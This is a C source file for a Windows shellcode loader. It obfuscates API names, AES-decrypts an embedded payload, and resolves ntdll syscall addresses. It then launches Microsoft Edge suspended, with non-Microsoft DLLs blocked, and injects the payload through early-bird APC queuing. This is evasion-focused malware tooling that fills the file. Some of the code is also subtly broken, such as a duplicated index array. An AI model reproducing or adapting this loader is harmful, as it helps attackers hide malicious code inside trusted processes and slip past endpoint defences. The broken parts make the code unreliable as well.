#include <windows.h>
#include <stdio.h>
#include "syscalls.h"
#include <tlhelp32.h>

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;


DWORD wNtAllocateVirtualMemory;
UINT_PTR sysAddrNtAllocateVirtualMemory;
DWORD wNtWriteVirtualMemory;
UINT_PTR sysAddrNtWriteVirtualMemory;
//DWORD wNtCreateThreadEx;
//UINT_PTR sysAddrNtCreateThreadEx;
DWORD wNtResumeThread;
UINT_PTR sysAddrNtResumeThread;
DWORD wNtOpenProcess;
UINT_PTR sysAddrNtOpenProcess;
DWORD wNtProtectVirtualMemory;
UINT_PTR sysAddrNtProtectVirtualMemory;
DWORD wNtQueueApcThread;
UINT_PTR sysAddrNtQueueApcThread;
//DWORD wNtUnmapViewOfSection;
//UINT_PTR sysAddrNtUnmapViewOfSection;

char* getoriginal(int offsets[], char* big_string, int sizeof_offset) {
    // Calculate the number of elements in the offsets array
    int num_offsets = sizeof_offset / sizeof(int);

    
    char* result = (char*)malloc(num_offsets + 1); 
    

    // Build the resulting string
    for (int i = 0; i < num_offsets; ++i) {
        result[i] = big_string[offsets[i]];
    }

    // Null-terminate the string
    result[num_offsets] = '\0';

    return result;
}

void aedecok(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)key, keyLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)coolcode, &coolcodeLen);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

typedef void* (*cool)(void*, size_t);

typedef struct _TEB {
    PVOID Reserved1[12];
    PPEB ProcessEnvironmentBlock;
} TEB, *PTEB;

cool Getaddress(const char *vv, const char *moduleName) {
#ifdef _M_X64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif

    PTEB teb;
#ifdef _M_X64
    teb = (PTEB)__readgsqword(0x30);
#else
    teb = (PTEB)__readfsdword(0x18);
#endif

    peb = teb->ProcessEnvironmentBlock;
    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY* moduleList = &ldr->InLoadOrderModuleList;
    LIST_ENTRY* entry = moduleList->Flink;

    // Convert moduleName to wide string (since BaseDllName is wide string)
    wchar_t wModuleName[MAX_PATH];
    mbstowcs(wModuleName, moduleName, MAX_PATH);

    while (entry != moduleList) {
        PLDR_DATA_TABLE_ENTRY module = (PLDR_DATA_TABLE_ENTRY)entry;
        entry = entry->Flink;

        if (!module->BaseDllName.Buffer) continue;
        
        wprintf(L"Loaded Module: %s\n", module->BaseDllName.Buffer);
        
        if (_wcsicmp(module->BaseDllName.Buffer, wModuleName) == 0) {  // Compare with variable
            BYTE* baseAddress = (BYTE*)module->DllBase;
            IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
            IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
            IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            
            if (exportDir.VirtualAddress == 0) return NULL;
            
            IMAGE_EXPORT_DIRECTORY* exportTable = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + exportDir.VirtualAddress);
            DWORD* nameArray = (DWORD*)(baseAddress + exportTable->AddressOfNames);
            WORD* ordinalArray = (WORD*)(baseAddress + exportTable->AddressOfNameOrdinals);
            DWORD* funcArray = (DWORD*)(baseAddress + exportTable->AddressOfFunctions);
            
            for (DWORD i = 0; i < exportTable->NumberOfNames; i++) {
                char* functionName = (char*)(baseAddress + nameArray[i]);
                printf("Exported Function: %s\n", functionName);
                
                if (strcmp(functionName, vv) == 0) {
                    DWORD funcRVA = funcArray[ordinalArray[i]];
                    void* funadd = (void*)(baseAddress + funcRVA);
                    printf("%s found at address: %p\n", vv, funadd);
                    return (cool)funadd;
                }
            }
        }
    }
    return NULL;
}



int main(int argc, char* argv[]) {
    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.\\:";


    unsigned char AESkey[] = {};
    unsigned char cool[] = {};
    SIZE_T coolSize = sizeof(cool);
    //Get a handle to the ntdll.dll library
    //hello
    int ntt[] = {39, 45, 29, 37, 37, 62, 29, 37, 37};
    const char* ntd = getoriginal(ntt, big_string, sizeof(ntt));
    HMODULE hNtdll = GetModuleHandleA(getoriginal(ntt, big_string, sizeof(ntt)));
    
    int ws_lld_ker_32[] = {36, 30, 43, 39, 30, 37, 55, 54, 62, 29, 37, 37};
    const char* ker32 = getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32));
    HMODULE istfromKe__ws_ls_32 = GetModuleHandleA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)));
    
    int ntalloc_mem[] = { 39, 19, 26, 11, 11, 14, 2, 0, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24 };
    // Get the address of the NtAllocateVirtualMemory function
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, getoriginal(ntalloc_mem, big_string, sizeof(ntalloc_mem)));
    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;

    int ntwrite_mem[] = { 39, 19, 48, 17, 8, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24 };
    const char* nt_write_V_mem=getoriginal(ntwrite_mem, big_string, sizeof(ntwrite_mem));
    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)Getaddress(nt_write_V_mem, ntd);
    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
    sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;

    int ntcre_thre[] = { 39, 19, 28, 17, 4, 0, 19, 4, 45, 7, 17, 4, 0, 3, 30, 23 };
    // Get the address of NtCreateThreadE
    //UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, getoriginal(ntcre_thre, big_string, sizeof(ntcre_thre)));
    //sysAddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;

    

    //UINT_PTR pNtResumeThread = (UINT_PTR)GetProcAddress(hNtdll, "NtResumeThread");
    const char* resthred="NtResumeThread";
    UINT_PTR pNtResumeThread = (UINT_PTR)Getaddress(resthred, ntd);
    wNtResumeThread = ((unsigned char*)(pNtResumeThread + 4))[0];
    sysAddrNtResumeThread = pNtResumeThread + 0x12;


    int prtevirmem[]={39, 19, 41, 17, 14, 19, 4, 2, 19, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24};
    const char* ntprovirtMem=getoriginal(prtevirmem, big_string, sizeof(prtevirmem));
    //UINT_PTR pNtProtectVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, getoriginal(prtevirmem, big_string, sizeof(prtevirmem)));
    UINT_PTR pNtProtectVirtualMemory = (UINT_PTR)Getaddress(ntprovirtMem, ntd);
    wNtProtectVirtualMemory = ((unsigned char*)(pNtProtectVirtualMemory + 4))[0];
    sysAddrNtProtectVirtualMemory = pNtProtectVirtualMemory + 0x12;
    
    int apcqu[]={39, 19, 41, 17, 14, 19, 4, 2, 19, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24};
    const char* ntqueuusrapc=getoriginal(apcqu, big_string, sizeof(apcqu));
    //UINT_PTR pNtQueueApcThread = (UINT_PTR)GetProcAddress(hNtdll, getoriginal(apcqu, big_string, sizeof(apcqu)));
    UINT_PTR pNtQueueApcThread = (UINT_PTR)Getaddress(ntqueuusrapc, ntd);
    wNtQueueApcThread = ((unsigned char*)(pNtQueueApcThread + 4))[0];
    sysAddrNtQueueApcThread = pNtQueueApcThread + 0x12;


    

    STARTUPINFOEX si = { 0 };  
    PROCESS_INFORMATION pi = { 0 };
    si.StartupInfo.cb = sizeof(STARTUPINFOEX); 

    SIZE_T attributeSize = 0;

    
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    PPROC_THREAD_ATTRIBUTE_LIST attributes = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeSize);
    InitializeProcThreadAttributeList(attributes, 1, 0, &attributeSize);


    DWORD policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(attributes, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
    
    si.lpAttributeList = attributes;

    //char* notpa[] = {28, 64, 63, 48, 8, 13, 3, 14, 22, 18, 63, 44, 24, 18, 19, 4, 12, 55, 54, 63, 13, 14, 19, 4, 15, 0, 3, 62, 4, 23, 4};
    
    //CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR) "/c start cmd.exe", NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi);

    CreateProcessA((LPSTR)"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi);
    
    
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    
    int virnuma[]={47, 8, 17, 19, 20, 0, 11, 26, 11, 11, 14, 2, 30, 23, 39, 20, 12, 0};
    const char* virtalloexnum=getoriginal(virnuma, big_string, sizeof(virnuma));
    LPVOID (*pvirnuma)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD) = 
    (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD)) 
    Getaddress(virtalloexnum,ker32);
    
    PVOID remoteMemory = pvirnuma(hProcess, NULL, coolSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);


    aedecok((char*)cool, sizeof(cool), AESkey, sizeof(AESkey));

    
    SIZE_T bytesWritten;
    


    NTSTATUS status = NtWriteVirtualMemory(hProcess, remoteMemory, cool, coolSize, (PULONG)&bytesWritten);
    


    
    DWORD oldProtect;
    


    status = NtProtectVirtualMemory(hProcess, &remoteMemory, &coolSize, PAGE_EXECUTE_READ, &oldProtect);


    
    


    
    status = NtQueueApcThread(hThread, (PVOID)remoteMemory, NULL, NULL, NULL);

    
    
    ULONG previousSuspendCount;
    status = NtResumeThread(hThread, &previousSuspendCount);

    return 0;
}
